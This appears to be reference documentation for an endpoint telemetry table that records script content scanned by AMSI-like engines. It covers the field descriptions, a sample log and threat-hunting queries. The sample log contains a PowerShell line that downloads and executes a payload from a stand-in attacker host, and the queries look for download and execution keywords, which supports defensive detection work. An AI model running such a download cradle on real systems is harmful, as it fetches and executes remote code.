## ScriptControlScanInfo Table: Script Content Event

### 1. Table Name
**ScriptControlScanInfo**

---

### 2. Table Usage
This event provides the content of a script that was scanned by a script control engine, such as the Antimalware Scan Interface (AMSI) on Windows. This is a powerful event for threat hunting as it captures the actual script content at the time of execution, which helps in identifying malicious, fileless, or obfuscated attacks that might otherwise be missed.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ScriptContent | The full text content of the script that was scanned. | All |
| ScriptContentName | The name or identifier for the script content, if available. | macOS, Linux |
| ScriptContentSource | The source of the script content, such as from a file, the command line, or an interactive session. | Linux, Windows |

---

### 4. Sample Log Example

```json
{
  "ScriptContent": "IEX(New-Object Net.WebClient).DownloadString('[http://evil.com/payload.ps1](http://evil.com/payload.ps1)')",
  "ScriptContentName": "/tmp/run.sh",
  "ScriptContentSource": "1"
}
```

---
### 5. Example Queries
```xql
// Find all script control scan events
event_simpleName=ScriptControlScanInfo

// Hunt for specific keywords within the script content
event_simpleName=ScriptControlScanInfo ScriptContent="*DownloadString*" OR ScriptContent="*Invoke-Expression*"

// Find scripts that originated from the command line
event_simpleName=ScriptControlScanInfo ScriptContentSource=2

// Look for scripts that have a specific name
event_simpleName=ScriptControlScanInfo ScriptContentName="*malicious.ps1"
```
---
